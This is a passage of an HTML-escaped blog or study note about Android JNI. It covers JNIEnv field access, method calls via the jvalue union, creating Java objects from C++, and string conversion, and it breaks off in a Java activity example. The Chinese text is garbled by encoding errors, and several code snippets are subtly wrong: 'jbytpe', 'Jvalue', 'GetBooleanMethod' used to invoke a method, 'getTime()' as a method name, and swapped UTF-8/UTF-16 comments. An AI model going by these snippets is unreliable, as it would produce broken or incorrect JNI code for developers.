&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">Java_com_naivete_jni_1study_Hello_sayHello&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">JNIEnv&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jobject&lt;/span> &lt;span class="n">instance&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// TODO
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">jclass&lt;/span> &lt;span class="n">helloclazz&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetObjectClass&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jfieldID&lt;/span> &lt;span class="n">id_number&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetFieldID&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">helloclazz&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;number&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;I&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//è·å–numberID
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">jint&lt;/span> &lt;span class="n">number&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetIntField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">id_number&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//è·å–numberçš„å€¼;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">cout&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="n">number&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//è¾“å‡ºåˆ°æ§åˆ¶å°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">SetIntField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">id_number&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">100L&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//è®¾ç½®numberçš„å€¼;æ³¨æ„jintå¯¹åº”c++ longç±»å‹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-2-1.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>JNIEnv è¿˜æä¾›äº†è®¸å¤šCallMethod å’ŒCallStaticMethod è¿˜æœ‰CallNovirtualMethodå‡½æ•°ï¼Œéœ€è¦é€šè¿‡GetMethodIDæ¥å–å¾—ç›¸åº”çš„æ–¹æ³•çš„jmethodIdä¼ å…¥åˆ°ä¸Šè¿°å‡½æ•°çš„å‚æ•°ä¸­&lt;/p>
&lt;p>è°ƒç”¨ç¤ºä¾‹æ–¹æ³•çš„ä¸‰ç§å½¢å¼å¦‚ä¸‹ï¼š&lt;/p>
&lt;p>&lt;code>Call&amp;lt;Type&amp;gt;Method(jobject obj,jmethodID id,id,Â·Â·Â·Â·Â·Â·Â·);&lt;/code> //å¸¸ç”¨çš„æ–¹å¼&lt;/p>
&lt;p>&lt;code>Call&amp;lt;Type&amp;gt;Method(jobject obj,jmethodID id,id,va_list lst);&lt;/code> //æœ‰æŒ‡å‘å‚æ•°è¡¨çš„va_listå˜é‡ï¼ˆå¾ˆå°‘ä½¿ç”¨ï¼‰&lt;/p>
&lt;p>&lt;code>Call&amp;lt;Type&amp;gt;Method(jobject obj,jmethodID id,id,jvalue * v);&lt;/code> //æœ‰æŒ‡å‘jvalueæˆ–jvalueæ•°ç»„æŒ‡é’ˆæ—¶ç”¨çš„&lt;/p>
&lt;p>jvalue æ˜¯unionè”åˆä½“ï¼Œå®šä¹‰jvalueæ•°ç»„ä¼ é€’åˆ°æ–¹æ³•ä¸­ï¼Œè¿™æ ·å¯ä»¥åŒ…å«å¤šç§ç±»å‹çš„å‚æ•°ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">union&lt;/span> &lt;span class="n">jvalue&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jboolean&lt;/span> &lt;span class="n">z&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jbytpe&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jchar&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jshort&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jint&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jlong&lt;/span> &lt;span class="n">j&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jfloat&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jdouble&lt;/span> &lt;span class="n">d&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jobject&lt;/span> &lt;span class="n">l&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;span class="n">jvalue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ¯”å¦‚åœ¨Javaä¸­æœ‰è¿™æ ·ä¸€ä¸ªæ–¹æ³•ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">boolean&lt;/span> &lt;span class="nf">function&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="kt">double&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="o">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Â·Â·Â·Â·Â·&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>1ï¼‰åœ¨C++ä¸­ä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ³•è°ƒç”¨functionæ–¹æ³•ï¼š&lt;/p>
&lt;p>&lt;code>env-&amp;gt;CallbooleanMethod(obj,id_function,10Lï¼Œ3.4ï¼ŒL'a')&lt;/code>&lt;/p>
&lt;p>obj:functonå¯¹è±¡ï¼Œid_function:functiondçš„id,10Lã€3.4ã€Lâ€™aâ€™æ˜¯å¯¹åº”çš„å‚æ•°ã€‚&lt;/p>
&lt;p>Lâ€™aâ€™ ä¸­çš„Læ˜¯å› ä¸ºJavaä¸­çš„å­—ç¬¦æ˜¯UnicodeåŒå­—èŠ‚çš„ï¼Œè€ŒC++ä¸­çš„å­—èŠ‚æ˜¯å•å­—èŠ‚çš„ï¼Œæ‰€ä»¥è¦å˜æˆå®½å­—ç¬¦ã€‚&lt;/p>
&lt;p>2ï¼‰åœ¨C++ä¸­ä½¿ç”¨ç¬¬ä¸‰ç§æ–¹æ³•functionè°ƒç”¨ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">jvalue* args = new Jvalue[3]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">args[0] = 10L;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">args[1] = 3.22;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">args[2] = L&amp;#39;a&amp;#39;;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">env-&amp;gt;GetBooleanMethod(obj,id_function,args);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">delete[] args; //æ˜¯å¦æŒ‡é’ˆå †å†…å­˜
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="232-javaå’Œcä¸­çš„å¤šæ€æœºåˆ¶">2.3.2 Javaå’ŒC++ä¸­çš„å¤šæ€æœºåˆ¶&lt;/h3>
&lt;p>JNIEnvä¸­çš„ç‰¹æ®Šæ–¹æ³•CallNovirtualMethodã€‚æ¥å¸®åŠ©javaè°ƒç”¨Javaä¸­çˆ¶ç±»çš„æ–¹æ³•ã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ä»‹ç»äº†-C++å’Œjavaå¤šæ€çš„åŸºç¡€çŸ¥è¯†ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ­¥éª¤ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>è·å–objä¸­å¯¹è±¡çš„class å¯¹è±¡ GetObjectClass(obj)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è·å–javaä¸­fatherå­—æ®µçš„id GetFieldID()&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è·å–fatherå­—æ®µçš„å¯¹è±¡ç±»å‹ GetObjectField&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è·å–fatherå¯¹è±¡çš„classå¯¹è±¡ FindClass&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è·å–fatherå¯¹è±¡ä¸­functionæ–¹æ³•ID GetMethodID()&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è°ƒç”¨çˆ¶ç±»ä¸­çš„functionæ–¹æ³•ï¼ˆä¼šæ‰§è¡Œå­ç±»çš„æ–¹æ³•ï¼‰CallvoidMethod&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è°ƒç”¨çˆ¶ç±»ä¸­çš„functionæ–¹æ³•ï¼ˆä¼šæ‰§è¡Œçˆ¶ç±»çš„æ–¹æ³•ï¼‰CallNonvirtualVoidMethod()&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="24-åˆ›å»ºjavaå¯¹è±¡åŠå­—ç¬¦ä¸²çš„æ“ä½œæ–¹æ³•">2.4 åˆ›å»ºJavaå¯¹è±¡åŠå­—ç¬¦ä¸²çš„æ“ä½œæ–¹æ³•&lt;/h3>
&lt;h3 id="241-nativeä¸­åˆ›å»ºjavaå¯¹è±¡">2.4.1 nativeä¸­åˆ›å»ºJavaå¯¹è±¡&lt;/h3>
&lt;p>â€‹ ä¸¤ç§æ–¹æ³•ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ç¬¬ä¸€ç§ï¼š&lt;/p>
&lt;p>&lt;code>jobject Newobject(jclass clazz,jmethodID methodID,Â·Â·Â·Â·Â·)&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>clazz éœ€è¦åˆ›å»ºçš„Javaå¯¹è±¡çš„Classå¯¹è±¡ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>methodID :ä¼ é€’ä¸€ä¸ªæ–¹æ³•çš„ID: æ„é€ æ–¹æ³•&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šæ„é€ å‡½æ•°éœ€è¦ä¼ å…¥çš„å‚æ•°å€¼ï¼ˆé»˜è®¤ä¸ä¼ é€’ï¼‰ é»˜è®¤æ„é€ æ–¹æ³•è¿”å›å€¼ç­¾åå§‹ç»ˆæ˜¯â€œ()Vâ€,æ–¹æ³•çš„åç§°å§‹ç»ˆæ˜¯â€œ&lt;/p>
&lt;p>â€ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>åœ¨C++ä¸­æ„é€ Javaä¸­çš„Dateå¯¹è±¡è°ƒç”¨æ–¹æ³•getTime():&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">jclass clazz_date = env-&amp;gt;FindClass(&amp;#34;java/util/Date&amp;#34;); //è·å–dateå¯¹è±¡
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jmethodID mid_date = env-&amp;gt;GetMethodID(clazz_date,&amp;#34;&amp;lt;init&amp;gt;&amp;#34;,&amp;#34;()V&amp;#34;); //è·å–æ„é€ æ–¹æ³•çš„ID
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jobject now = env-&amp;gt;NewObject(clazz_date,mid_date); //ç”ŸæˆDateå¯¹è±¡
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jmethodID mid_date_getTime = env-&amp;gt;GetMethodID(clazz_date,&amp;#34;getTime()&amp;#34;,&amp;#34;()J&amp;#34;); //è·å–getTimeçš„ID
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jlong time = env-&amp;gt;CallLongMethod(now,mid_date_getTime);//è°ƒç”¨getTimeè¿”å›æ—¶é—´
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">printf(&amp;#34;%I64d&amp;#34;,time);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>ç¬¬äºŒç§ï¼š&lt;/p>
&lt;p>ç”¨AllocObjectå‡½æ•°åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥æ ¹æ®ä¼ å…¥çš„jclassåˆ›å»ºä¸€ä¸ªjavaå¯¹è±¡ï¼Œä½†æ˜¯çŠ¶æ€æ—¶æœªåˆå§‹åŒ–çš„ï¼Œåœ¨è¿™ä¸ªå¯¹è±¡ä¹‹å‰ç»å¯¹è¦ç”¨CallNonvirtualVoidMethodæ¥è°ƒç”¨è¯¥jclassçš„æ„é€ å‡½æ•°è¿™æ ·å¯ä»¥å»¶è¿Ÿæ„é€ å‡½æ•°çš„è°ƒç”¨ã€‚ç”¨çš„æ¯”è¾ƒå°‘ã€‚&lt;/p>
&lt;p>egï¼šç•¥ï¼›&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="242-nativeä¸­æ“ä½œjavaå­—ç¬¦ä¸²">2.4.2 nativeä¸­æ“ä½œJavaå­—ç¬¦ä¸²&lt;/h3>
&lt;p>â€‹ Java-Stringå¯¹è±¡æ˜¯Unicode(UTF-16)ç  ä¸€ä¸ªå­—ç¬¦æ€»æ˜¯å ç”¨ä¸¤ä¸ªå­—èŠ‚ å¯ä»¥é€šè¿‡JNIæ¥å£å°†Javaä¸­çš„å­—ç¬¦ä¸²è½¬æ¢åˆ°C++çš„å®½å­—ç¬¦ä¸²ï¼ˆwchar_t*),æˆ–è€…ä¼ å›ä¸€ä¸ªUTF-8ç¼–ç çš„å­—ç¬¦ä¸²ï¼ˆchar * )åˆ°C++ åè¿‡æ¥åŒç†ã€‚&lt;/p>
&lt;p>JNIEnvä¸­çš„ä¸€äº›C++æ–¹æ³•ï¼š&lt;/p>
&lt;p>1ï¼‰è·å–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼š&lt;/p>
&lt;p>â€‹ &lt;code>jsize GetStringLength(jstring j_msg)&lt;/code>&lt;/p>
&lt;ol>
&lt;li>å°†jstring å¯¹è±¡æ‹·è´åˆ°const jchar* æŒ‡é’ˆå­—ç¬¦ä¸²ï¼š&lt;/li>
&lt;/ol>
&lt;p>â€‹ //æ‹·è´Javaå­—ç¬¦ä¸²å¹¶ä»¥UTF-8ç¼–ç ä¼ å…¥jstr:&lt;/p>
&lt;p>â€‹ &lt;code>env-&amp;gt;GetStringRegion(jstring j_msg.jsize start,jszie len,jchar* jstr);&lt;/code>&lt;/p>
&lt;p>â€‹ ////æ‹·è´Javaå­—ç¬¦ä¸²å¹¶ä»¥UTF-16ç¼–ç ä¼ å…¥jstr:&lt;/p>
&lt;p>â€‹ &lt;code>env-&amp;gt;GetStringUTFRegion(jstring j_msg.jsize start,jszie len, char* jstr);&lt;/code>&lt;/p>
&lt;ol>
&lt;li>ç”Ÿæˆä¸€ä¸ªjstring å¯¹è±¡&lt;/li>
&lt;/ol>
&lt;p>â€‹ &lt;code>jobject NewString(const jchar* jstr,int size);&lt;/code>&lt;/p>
&lt;p>â€‹ å°†å­—ç¬¦ä¸²æŒ‡é’ˆjstrè½¬æ¢æˆjstringã€‚&lt;/p>
&lt;ol>
&lt;li>å°†jstringå¯¹è±¡è½¬æ¢æˆconst jchar* å­—ç¬¦ä¸²æŒ‡ã€‚&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>GetStringChars å¼€å†…å­˜ æŒ‡é’ˆæŒ‡å‘å…ˆå¼€çš„å†…å­˜&lt;/p>
&lt;p>&lt;code>const* jchar * GetStringChars(jstring j_msg,jboolean* copied)&lt;/code>&lt;/p>
&lt;p>è¿”å›ä¸€ä¸ªUTF-16ç¼–ç çš„å®½å­—ç¬¦ä¸²ï¼ˆjchar*);&lt;/p>
&lt;p>å¯¹åº”çš„é‡Šæ”¾å†…å­˜æ–¹æ³•ï¼š&lt;/p>
&lt;p>&lt;code>ReleaseStringChars(jstring j_msg,const jchar* jstr)&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>GetStringUTFChars ä¸å¼€å†…å­˜ç›´æ¥æŒ‡å‘Javaä¸­stringçš„æŒ‡é’ˆ&lt;/p>
&lt;p>&lt;code>const char* GetStringUTFChars(jstring str,jboolean* copied)&lt;/code>&lt;/p>
&lt;p>å–å¾—UTF-8ç¼–ç çš„å­—ç¬¦ä¸²&lt;/p>
&lt;p>é‡Šæ”¾ï¼š&lt;/p>
&lt;p>&lt;code>ReleaseStringUTFChars(jstring j_msg,const jchar* jstr)&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>å°†jstring å¯¹è±¡è½¬åŒ–æˆconst jchar* å­—ç¬¦ä¸²æŒ‡é’ˆï¼š&lt;/li>
&lt;/ol>
&lt;p>â€‹ &lt;code>const jchar* GetStringCritical(jstring j_msg,Jboolean* copied)&lt;/code>&lt;/p>
&lt;p>â€‹ ä½œç”¨:å¢åŠ ç›´æ¥ä¼ å›æŒ‡å‘Javaå­—ç¬¦ä¸²çš„æŒ‡é’ˆçš„å¯èƒ½æ€§ï¼ˆè€Œä¸æ˜¯æ‹·è´ï¼‰ï¼›&lt;/p>
&lt;p>â€‹ åœ¨&lt;code>GetStringCritical/ReleaseStringCritical&lt;/code>ä¹‹é—´çš„å…³é”®åŒºåŸŸä¹‹é—´ä¸èƒ½è°ƒç”¨ä»»ä½•å…¶ä»–JNIå‡½æ•°ã€‚å¦åˆ™ä¼šé€ æˆå…³é”®åŒºåŸŸä»£ç æ‰§è¡ŒæœŸé—´åƒåœ¾å›æ”¶å™¨åœæ­¢å·¥ä½œã€‚ä»»ä½•è§¦å‘åƒåœ¾å›æ”¶å™¨çš„çš„çº¿ç¨‹ä¹Ÿå°†æš‚åœã€‚&lt;/p>
&lt;p>â€‹ é‡Šæ”¾ï¼š&lt;/p>
&lt;p>â€‹ &lt;code>ReleaseStringCritical(jstring j_msg,const jchar* jstr)&lt;/code>&lt;/p>
&lt;p>å®ä¾‹egï¼šï¼ˆä¸ä¹¦ä¸Šä¸åŒ,æ€è·¯å¤§æ¦‚ç›¸åŒï¼‰&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">MainActivity&lt;/span> &lt;span class="kd">extends&lt;/span> &lt;span class="n">AppCompatActivity&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="n">EditText&lt;/span> &lt;span class="n">et&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="n">TextView&lt;/span> &lt;span class="n">tv&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="n">Button&lt;/span> &lt;span class="n">bt&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">text&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Used to load the &amp;#39;native-lib&amp;#39; library on application startup.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">loadLibrary&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;native-lib&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">protected&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">onCreate&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Bundle&lt;/span> &lt;span class="n">savedInstanceState&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">super&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">onCreate&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">savedInstanceState&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">setContentView&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">R&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">layout&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">activity_main&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">et&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">findViewById&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">R&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">id&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">editText&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tv&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">findViewById&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">R&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">id&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">tv&lt;/span>&lt;span class="o">);&lt;/span>
